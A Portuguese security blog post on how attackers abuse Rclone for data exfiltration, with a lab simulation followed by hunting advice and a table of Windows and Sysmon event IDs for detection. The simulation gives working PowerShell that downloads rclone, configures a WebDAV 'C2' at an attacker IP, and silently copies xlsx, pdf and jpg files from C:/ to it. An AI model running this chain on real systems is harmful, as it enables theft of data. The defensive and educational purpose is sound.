---
title: "Usando o Rclone para exfiltração de dados: Técnicas de hunting, defesa e detecção"
date: 2024-11-05T23:23:51-03:00
draft: false
description: "Exploramos como o Rclone pode ser usado na exfiltração de dados, simulando ataques e apresentando técnicas de hunting, defesa e análise de logs para proteger ambientes corporativos de ameaças avançadas."
noindex: false
featured: false
pinned: false
comments: false
series:
#  - 
categories:
 - Ransomware
 - Windows
 - Exfiltração
tags:
 - rclone
 - exfiltração
 - c2
 - criptografia
 - hunting
 - windows
images:
#  - 
authors:
 - sandson
---
## 1. Introdução

O Rclone é um programa de linha de comando extremamente poderoso e altamente flexível, capaz de gerenciar arquivos no armazenamento em nuvem. Originalmente inspirado no famoso Rsync, ele suporta mais de 70 serviços de armazenamento em cloud, como Google Drive, OneDrive, Amazon S3, DropBox e muitos outros. Ele permite, por linhas de comando, interações como cópia, sincronização, montagem de disco virtual local, stream de arquivos e tantas outras opções.

Muito embora sua aplicação possa ser legítima em serviços de backups e sincronização, também é amplamente explorada por agentes mal-intencionados na exfiltração de dados, como ocorre com certos tipos de ransomwares.

Neste artigo técnico, vamos explorar sua capacidade de exfiltrar dados, como os atacantes podem utilizar a ferramenta durante um ataque, bem como métodos de defesa, detecção e hunting para aumentar a segurança no ambiente corporativo contra esse tipo de ameaça.

## 2. Usando o Rclone para exfiltração de dados

Abaixo, vamos preparar nosso ambiente para simular como um atacante pode usar o Rclone para exfiltrar dados:

### Passo 1: Sobre o ambiente de teste

Para usar o Rclone, o atacante primeiro precisa baixar a ferramenta no sistema comprometido. Para o nosso cenário de testes, vamos fazer uma viagem temporal e considerar que o atacante já está de posse do sistema. Aqui no nosso teste, vamos usar um ambiente Windows como alvo e o Kali Linux como nosso C2.

### Passo 2: Entendendo a configuração e uso do Rclone

O Rclone possui dois modos de operação e configuração. Com o comando `rclone`, você consegue ver todas as opções de uso para ele. O modo mais comum de uso, é utilizar o `rclone config`, com essa opção você inicia a configuração para seu serviço cloud de sua escolha, por exemplo, o OneDrive.

Mas para o nosso cenário de exfiltração, vamos utilizar um médodo bastante comum, que é utilizar um `config.conf`. Na verdade, quando você configura um serviço cloud, ele cria automaticamente um arquivo chamado `rclone.conf` com as configurações de sua escolha.

### Passo 3: Preparando o ambiente

Primeiro vamos configurar o nosso C2. No Kali Linux, com o rclone instalado, execute o comando abaixo:

```bash
rclone serve webdav /home/kali/C2 --addr :1337 --user exfil --pass tration --log-file rclone.log --log-level INFO
```

Neste nosso cenário, estamos configurando um servidor WebDAV bem simples só para exemplo do teste. 

Ele escutará na porta 1337 e receberá como parâmetro um usuário e senha. Os logs de recebimento dos dados ficarão salvos em `rclone.log` com o nível do log informacional.

Próximo passo agora é baixar e configurar o rclone no nosso alvo e iniciar a exfiltração. Vamos dividir os comandos em partes para facilitar o entendimento. Lembrando que em um cenário real, o agente malicioso pode usar os comandos tudo junto ou utilizar outros artíficios para fazer semelhante ao que vamos fazer aqui. Para isso, vamos baixar o rclone.

Copie tudo e execute no terminal PowerShell:

```powershell
$url = "https://downloads.rclone.org/v1.68.1/rclone-v1.68.1-windows-amd64.zip"
$downloadPath = "$env:TEMP\rclone.zip"
$extractPath = "$env:TEMP\rclone"
Invoke-WebRequest -Uri $url -OutFile $downloadPath
Expand-Archive -Path $downloadPath -DestinationPath $extractPath
Set-Location -Path $extractPath
Copy-Item -Path "rclone-v1.68.1-windows-amd64/rclone.exe"
Remove-Item -Path "rclone-v1.68.1-windows-amd64" -Recurse -Force
```

Aqui estamos baixando o arquivo para a pasta `%temp%` do usuário logado, extraindo o arquivo para uma pasta chamada rclone, acessando a página, copiando o binário da pasta extraída, removendo o restante da pasta que não vai ser mais necessário seu uso.

Agora vamos configurar o `config.conf`. Nele vamos configurar o nosso acesso ao C2.

```powershell
$obscurePassword = .\rclone.exe obscure tration
$configContent = @"
[webdav-exfil]
type = webdav
url = http://192.168.125.145:1337
vendor = other
user = exfil
pass = $obscurePassword
"@
$configFilePath = "config.conf"
Set-Content -Path $configFilePath -Value $configContent
```

O comando `$obscurePassword = .\rclone.exe obscure tration` é usado para ofuscar a senha em texto claro, pois o rclone só funciona se estiver com a senha ofuscada.

### Passo 4: Iniciando a exfiltração

Com nosso ambiente alvo devidamente configurado, vamos iniciar a exfiltração:

```powershell
.\rclone.exe --config config.conf copy C:/ --include "*.xlsx" --include "*.pdf" --include "*.jpg" webdav-exfil: >$null 2>&1
```

O comando acima irá copiar tudo que estiver a partir do caminho C:/ e tudo que for `.pdf`, `.xlsx` ou `.jpg` e enviará para o nosso C2 configurado.

O comando `>$null 2>&1` também pode ser usado como `*> $null`, e ele tem a função apenas de ocultar erros e o output no terminal. Caso queira ver o progresso, você pode remover o `>$null 2>&1` e incluir `--progress` no final para ver o output.

Outra opção que pode ser usada é o comando `--exclude <caminho>`, que pode ser usado para ignorar certas pastas no sistema. Podemos limitar a taxa de transferência ou a duração. Para isso, você pode consultar a documentação oficial para amiores destalhes.

Ao juntar essas duas partes de código em um só, você é capaz de baixar e configurar o rclone e já iniciar a exfiltração.

<figure style="text-align: center;">
  <video width="640" height="340" controls>
    <source src="poc.mp4" type="video/mp4">
    Seu navegador não suporta a tag de vídeo.
  </video>
  <figcaption><i>PoC do exemplo mostrado acima.</i></figcaption>
</figure>

## 3. Técnicas de Hunting para detecção e defesa

Muito embora o uso do Rclone seja legítimo para alguns cenários corporativos, ele pode ser detectado em ambientes que não usam ou permitem o uso do mesmo, com a implementação das técnicas de hunting apropriadas. Algumas abordagens incluem:

- **Controle de executáveis:** Utilizar políticas de controle de aplicações como o AppLocker ou WDAC para impedir a execução de binários não autorizados. Bloquear uso de ferramentas de cloud não homolgadas pela empresa.

- **Controle via DLP:** Embora exista a possibilidade de muitos falsos-positivos, trabalhar com o uso de DLP e ir refinando as regras de DLP pode ser de grande utilidade contra exfiltração de informações.

- **Restrição de protocolos de rede:** No teste foi usado o WebDAV, entretanto, se houver a possibilidade de bloquear protocolos não utilizados, ainda que não haja evidências de uso de outros protocolos, é interessante bloquear, assim reduz as chances de algum incidente futuro.

- **Indicadores de Comprometimento (IoCs):** Pesquisar pelo uso do binário pelo seu nome. Compilar as hashs de versões do Rclone e pesquisar no ambiente. Pesquisar arquivos `.conf` no ambiente.

- **Conscientização:** O elo mais fraco da segurança é o humano, então, trabalhar em treinamentos de usuários para melhores práticas de seguranças e afins, também contribui para um ambiente mais seguro.

## 4. Eventos de logs que podem contribuir para identificação

Nos meus testes, usei o binário com seu nome original, portanto, não se limite apenas ao que foi exposto aqui, tenha isso como base, mas tenha em mente que o agente malicioso sempre irá tentar burlar todos os mecanismos.

Eventos de logs identificados nos meus testes:

| Event ID | Source                              | Observações                                                                                                                                                                                                                                                                                                                                                                 |
|:--------:|:-------------------------------------:|:-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------:|
|   4656   | Microsoft-Windows-Security-Auditing | Indica que um objeto foi requisitado. No Windows, tudo é tratado como objeto. Ele mostra o usuário que executou a ação e o caminho completo do binário. O Handle ID é um importante aliado na pesquisa.                                                                                                                                                                     |
|   4663   | Microsoft-Windows-Security-Auditing | Ele é gerado entre o 4656 e o 4658. Basicamente informa as permissões do arquivo. Embora em um incidente as permissões que ele tenha não sejam de grande relevância, mas o evento em si contribui para identificação do artefato. Esse evento gerou com a contribuição de um File Integrity Monitoring que eu tenho instalado no meu host. O Handle ID também é importante. |
|   4658   | Microsoft-Windows-Security-Auditing | Apenas indica que um objeto foi encerrado. Esse é a sequencia final dos eventos anteriores. Ambos podem ser relacionados pelo Handle ID.                                                                                                                                                                                                                                    |
| 1        | Microsoft-Windows-Sysmon            | Registra quando um processo é criado. A criação do processo ocorre sempre que um binário é executado. Além dele mostrar todo o comando executado, ele trás o hash e o GUID que pode ser correlacionado com o Event ID 7 pelo GUID, por exemplo.                                                                                                                             |
| 3        | Microsoft-Windows-Sysmon            | Registra uma conexão TCP/UDP no host. Mostra origem e destino e portas. Pode ser relacionado pelo GUID.                                                                                                                                                                                                                                                                     |
| 22       | Microsoft-Windows-Sysmon            | Esse evento é registrado quando consultado o DNS. Mostra a url ou ip e pode ser relacionado pelo GUID.                                                                                                                                                                                                                                                                      |
| 4688     | Microsoft-Windows-Security-Auditing | Assim como o Event ID 1, esse evento também registra a criação de um processo nativamente.                                                                                                                                                                                                                                                                                  |
| 11       | Microsoft-Windows-Sysmon            | Registra quando um arquivo é criado. Pode ser correlacionado com o Event ID 7 pelo GUID.                                                                                                                                                                                                                                                                                    |
| 5        | Microsoft-Windows-Sysmon            | Registra quando um processo é encerrado. Pode ser correlacionado com o Event ID 7 pelo GUID.                                                                                                                                                                                                                                                                                |
| 7        | Microsoft-Windows-Sysmon            | Registra quando um processo é carregado. Ele registra também o hash que pode ser correlacionado com outros Event ID ou até mesmo com EDR configurado para identificar hashs do rclone.                                                                                                                                                                                      |
| 4660     | Microsoft-Windows-Security-Auditing | Indica a deleção de um objeto. Ele não traz o nome do arquivo, mas pode se identificado e correlacionado por meio do Handle ID, com os 3 primeiros eventos dessa lista.                                                                                                                                                                                                     |

## 5. Conclusão

O Rclone é uma ferramenta poderosa que pode ser utilizada tanto para fins legítimos quanto maliciosos. Compreender como ele pode ser explorado por atacantes é fundamental para implementar defesas eficazes em um ambiente corporativo. Técnicas de hunting e uma estratégia sólida de defesa, como o monitoramento de tráfego de rede e a análise de logs, podem ajudar a detectar e mitigar a exfiltração de dados via Rclone antes que danos significativos ocorram. Essas estratégias não apenas fortalecem a segurança do ambiente, mas também oferecem caminhos claros para investigação e mitigação rápida de incidentes envolvendo ferramentas como o Rclone.


## 6. Referências

- [WebDAV: para que serve e como configurá-lo no Windows 10](https://itigic.com/pt/webdav-how-to-configure-it-in-windows-10/)
- [WebDAV - Rclone](https://rclone.org/webdav/)
- [Log-Level - Rclone](https://rclone.org/docs/#log-level-level)
- [Filtering - Rclone](https://rclone.org/filtering/)
- [Copy - Rclone](https://rclone.org/commands/rclone_copy/)
- [Documentação - Rclone](https://rclone.org/docs/)
- [Sysmon v15.15](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)

{{< bs/alert warning >}}
{{< bs/alert-heading "Encontrou algum erro? Quer sugerir alguma mudança ou acrescentar algo?" >}}
Por favor, entre em contato comigo pelo meu <a href="https://www.linkedin.com/in/sandsoncosta">LinkedIn</a>.<br>Vou ficar muito contente em receber um feedback seu.
{{< /bs/alert >}}

---
<!-- begin wwww.htmlcommentbox.com -->
  <div id="HCB_comment_box"><a href="http://www.htmlcommentbox.com">Widget</a> is loading comments...</div>
 <link rel="stylesheet" type="text/css" href="https://www.htmlcommentbox.com/static/skins/bootstrap/twitter-bootstrap.css?v=0" />
<!-- end www.htmlcommentbox.com -->